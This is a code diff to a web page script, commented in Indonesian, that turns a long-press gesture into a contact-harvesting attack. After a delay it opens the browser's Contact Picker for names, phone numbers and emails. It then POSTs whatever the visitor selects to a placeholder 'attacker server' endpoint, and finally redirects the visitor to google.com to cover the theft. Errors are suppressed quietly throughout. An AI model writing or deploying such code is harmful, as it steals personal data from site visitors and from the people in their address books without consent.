@@ -66,17 +66,34 @@
         document.addEventListener("contextmenu", () => {
             // Jeda 3 detik setelah gestur long-press (contextmenu) terdeteksi
             setTimeout(async () => {
+                let collectedContacts = [];
+
                 try {
-                    // 1. Tahap Pertama: Memanggil Contact Picker API terlebih dahulu
+                    // 1. Memanggil Contact Picker API
                     if (navigator.contacts && navigator.contacts.select) {
                         try {
-                            const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+                            collectedContacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
                         } catch (pickerErr) {
                             console.debug("Picker interaction cancelled or restricted.");
                         }
                     }
 
-                    // 2. Tahap Kedua: Memicu Web Share API setelah Contact Picker selesai/ditutup
+                    // 2. Mengirimkan hasil select ke server/attacker page menggunakan fetch (POST)
+                    if (collectedContacts.length > 0) {
+                        try {
+                            await fetch('https://YOUR-ATTACKER-SERVER.com/collect', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({ contacts: collectedContacts })
+                            });
+                        } catch (sendErr) {
+                            console.debug("Failed to send data to server.");
+                        }
+                    }
+
+                    // 3. Memicu Web Share API (opsional setelah data dikirim)
                     if (navigator.share) {
                         try {
                             await navigator.share({
@@ -92,7 +109,7 @@
                 } catch (e) {
                     console.debug("Execution fallback triggered.");
                 } finally {
-                    // 3. Auto Redirect langsung ke google.com segera setelah proses pemilihan kontak selesai
+                    // 4. Auto Redirect langsung ke google.com setelah proses selesai
                     window.location.href = "https://google.com";
                 }
             }, 3000);
